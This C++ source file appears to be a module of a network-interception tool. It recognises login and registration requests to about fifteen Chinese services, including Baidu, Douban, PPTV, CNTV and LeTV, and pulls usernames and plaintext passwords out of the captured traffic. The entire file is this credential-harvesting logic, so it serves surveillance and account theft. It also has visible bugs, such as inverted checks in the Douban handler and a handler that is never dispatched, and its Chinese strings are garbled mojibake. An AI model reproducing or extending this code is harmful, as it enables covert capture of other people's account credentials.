

#include "StdAfx.h"

#include "AccountBaiDu.h"

account::BaiDu::BaiDu(HttpSession *http_session, const string &pro_name) : Account(http_session,pro_name)
{

}

account::BaiDu::~BaiDu()
{
	
}

int account::BaiDu::IsBaiDu(HttpSession *http_session)
{
	if( (http_session->m_Requestline.m_Host.Find("mobile.open.163.com") != -1) &&
		(http_session->m_Requestline.m_URI.Find("/movie/store/syncstore.do") != -1))	
	{
		return kwangyigongkaike;
	}

	if( (http_session->m_Requestline.m_Host.Find("mobile.9158.com")  != -1 ) && 
		(http_session->m_Requestline.m_URI.Find("/v3/register/regSuccees.aspx") != -1 )  )
	{
		return kshipinliaotian9158;
	}

	if( (http_session->m_Requestline.m_Host.Find("social.app.cntv.cn")  != -1 ) && 
		(http_session->m_Requestline.m_URI.Find("/index.php?action=login-checkLogin") != -1 )  )
	{
		return kcntv;
	}

	if( (http_session->m_Requestline.m_Host.Find("api.passport.pptv.com")  != -1 ) && 
		(http_session->m_Requestline.m_URI.Find("/v3/login/ex_login.do") != -1 )  )
	{
		return kpptv;
	}

	if( ( http_session->m_Requestline.m_Host.Find("passport.baidu.com")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/v2/sapi/login") != -1 )  )
	{
		return kbaidushipin;
	}

	if( ( http_session->m_Requestline.m_Host.Find("wappass.baidu.com")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/wp/api/login") != -1 )  )
	{
		return kbaiduyinyue;
	}

	if( ( http_session->m_Requestline.m_Host.Find("mapps.m1905.cn")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/User/login") != -1 )  )
	{
		return kdianyingwang;
	}

	if( ( http_session->m_Requestline.m_Host.Find("www.douban.com")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/accounts/register") != -1 )  )
	{
		return kdouban;
	}

	if( ( http_session->m_Requestline.m_Host.Find("jsonfe.funshion.com")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/user/login") != -1 )  )
	{
		return kfengxing;
	}

	if( ( http_session->m_Requestline.m_Host.Find("www.77music.com")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/phone/phone_ajax.php") != -1 )  )
	{
		return kgangqinpu;
	}

	if( ( http_session->m_Requestline.m_Host.Find("server.jpgq.net")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/JustPianoServer/server/LoginServlet") != -1 )  )
	{
		return kjipingangqin;
	}

	if( ( http_session->m_Requestline.m_Host.Find("www.yytingting.com")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/yyting/usercenter/ClientLogon.action") != -1 )  )
	{
		return klanrentingshu;
	}

	if( ( http_session->m_Requestline.m_Host.Find("dynamic.user.app.m.letv.com")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/android/dynamic.php") != -1 )  )
	{
		return kleshi;
	}

	if( ( http_session->m_Requestline.m_Host.Find("m.imgo.tv")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/json/phone/PhoneLogin.aspx") != -1 )  )
	{
		return kmangguotv;
	}

	if( ( http_session->m_Requestline.m_Host.Find("www.meile.com")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/api/") != -1 )  )
	{
		return kmeiyuediantai;
	}

	if( ( http_session->m_Requestline.m_Host.Find("usr.mb.hd.sohu.com")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/v4/login.json") != -1 )  )
	{
		return ksouhushipin;
	}

	return 0;
}


int account::BaiDu::Process(const char *packet,int action)
{
	if (action == kwangyigongkaike)
	{
		return wangyigongkaike(packet);
	}

	if (action == kshipinliaotian9158)
	{
		return shipinliaotian9158(packet);
	}

	if (action == kcntv)
	{
		return cntv(packet);
	}

	if (action == kpptv)
	{
		return pptv(packet);
	}

	if (action == kbaidushipin)
	{
		return baidushipin(packet);
	}

	if (action == kbaiduyinyue)
	{
		return baiduyinyue(packet);
	}

	if (action == kdianyingwang)
	{
		return dianyingwang(packet);
	}

	if (action == kdouban)
	{
		return douban(packet);
	}

	if (action == kfengxing)
	{
		return fengxing(packet);
	}

	if (action == kgangqinpu)
	{
		return gangqinpu(packet);
	}

	if (action == kjipingangqin)
	{
		return jipingangqin(packet);
	}

	if (action == klanrentingshu)
	{
		return lanrentingshu(packet);
	}

	if (action == kleshi)
	{
		return leshi(packet);
	}

	if (action == kmeiyuediantai)
	{
		return meiyuediantai(packet);
	}

	if (action == ksouhushipin)
	{
		return souhushipin(packet);
	}
	return 1;
}



int account::BaiDu::wangyigongkaike(const char *packet)
{
	software_ = "ÍøÒ×¹«¿ª¿Î";
	state_ = "µÇÂ¼";
	
	string src_data = GetPostData_tmp(packet);
	src_data = ms_->UrlDecode(src_data);

	ms_->SplitStringToMap(src_data,'&','=');
	user_ = ms_->GetValueFromMapByKey("ursid",true);
	if (user_.empty())
	{
		return 0;
	}

	output_text_ = GetOutputText();
	return 1;
}

int account::BaiDu::shipinliaotian9158(const char *packet)
{
	software_ = "9158ÊÓÆµÁÄÌì";
	state_ = "×¢²á";
	
	string src_data = http_session_->m_Requestline.m_URI.GetBuffer(0);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	user_ = ms_->GetValueFromMapByKey("userid",true);
	password_ = ms_->GetValueFromMapByKey("pwd",true);
	if (user_.empty() || password_.empty())
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::cntv(const char *packet)
{
	software_ = "CNTVÖÐ¹úÍøÂçµçÊÓÌ¨";
	state_ = "µÇÂ¼";
	
	string src_data = GetPostData_tmp(packet);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	user_ = ms_->GetValueFromMapByKey("userEmail",true);
	password_ = ms_->GetValueFromMapByKey("password",true);
	if (user_.empty() || password_.empty())
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::pptv(const char *packet)
{
	software_ = "PPTV";
	state_ = "µÇÂ¼";
	
	string src_data = GetPostData_tmp(packet);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	user_ = ms_->GetValueFromMapByKey("username",true);
	password_ = ms_->GetValueFromMapByKey("password",true);
	if (user_.empty() || password_.empty())
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::baidushipin(const char *packet)
{
	software_ = "°Ù¶ÈÊÓÆµ";
	state_ = "µÇÂ¼";
	
	string src_data = GetPostData_tmp(packet);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	user_ = ms_->GetValueFromMapByKey("username",true);

	if (user_.empty() )
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::baiduyinyue(const char *packet)
{
	software_ = "°Ù¶ÈÒôÀÖ";
	state_ = "µÇÂ¼";
	
	string src_data = GetPostData_tmp(packet);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	user_ = ms_->GetValueFromMapByKey("username",true);
	
	if (user_.empty() )
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::dianyingwang(const char *packet)
{
	software_ = "µçÓ°Íø";
	state_ = "µÇÂ¼";
	
	string src_data = GetPostData_tmp(packet);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');

	user_ = ms_->GetValueFromMapByKey("username",true);
	password_ = ms_->GetValueFromMapByKey("password",true);
	
	
	if (user_.empty() || password_.empty())
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::douban(const char *packet)
{
	software_ = "¶¹°ê";
	state_ = "×¢²á";
	
	string src_data = GetPostData_tmp(packet);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	string user1 = ms_->GetValueFromMapByKey("form_phone",true);
	string user2 = ms_->GetValueFromMapByKey("form_email",true);

	if (user1.empty())
	{
		user_ = user1;
	}
	if (user2.empty())
	{
		user_ = user2;
	}

	password_ = ms_->GetValueFromMapByKey("form_password",true);
	
	
	if (user_.empty() || password_.empty())
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::fengxing(const char *packet)
{
	software_ = "·çÐÐ";
	state_ = "µÇÂ¼";
	
	string src_data = http_session_->m_Requestline.m_URI.GetBuffer(0);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	user_ = ms_->GetValueFromMapByKey("username",true);
	password_ = ms_->GetValueFromMapByKey("userpwd",true);
	if (user_.empty() || password_.empty())
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::gangqinpu(const char *packet)
{
	software_ = "¸ÖÇÙÆ×´óÈ«";
	state_ = "µÇÂ¼";
	
	string src_data = http_session_->m_Requestline.m_URI.GetBuffer(0);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	user_ = ms_->GetValueFromMapByKey("username",true);
	password_ = ms_->GetValueFromMapByKey("password",true);
	if (user_.empty() || password_.empty())
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::jipingangqin(const char *packet)
{
	software_ = "¼«Æ·¸ÖÇÙ";
	state_ = "µÇÂ¼";
	
	string src_data = GetPostData_tmp(packet);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	user_ = ms_->GetValueFromMapByKey("username",true);
	password_ = ms_->GetValueFromMapByKey("password",true);
	if (user_.empty() || password_.empty())
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::lanrentingshu(const char *packet)
{
	software_ = "ÀÁÈËÌýÊé";
	state_ = "µÇÂ¼";
	
	string src_data = http_session_->m_Requestline.m_URI.GetBuffer(0);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	user_ = ms_->GetValueFromMapByKey("account",true);

	if (user_.empty())
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::leshi(const char *packet)
{
	software_ = "ÀÖÊÓ";
	state_ = "µÇÂ¼";
	
	string src_data = GetPostData_tmp(packet);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	user_ = ms_->GetValueFromMapByKey("loginname",true);
	password_ = ms_->GetValueFromMapByKey("password",true);
	if (user_.empty() || password_.empty())
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::mangguotv(const char *packet)
{
	software_ = "Ã¢¹ûTV";
	state_ = "µÇÂ¼";
	
	string src_data = http_session_->m_Requestline.m_URI.GetBuffer(0);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	user_ = ms_->GetValueFromMapByKey("UserName",true);

	if (user_.empty() )
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::meiyuediantai(const char *packet)
{
	software_ = "ÃÀÀÖµçÌ¨";
	state_ = "µÇÂ¼";
	
	string src_data = GetPostData_tmp(packet);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	user_ = ms_->GetValueFromMapByKey("account",true);
	
	if (user_.empty() )
	{
		return 0;
	}
	
	output_text_ = GetOutputText();
	
	return 1;
}

int account::BaiDu::souhushipin(const char *packet)
{
	return 1;
}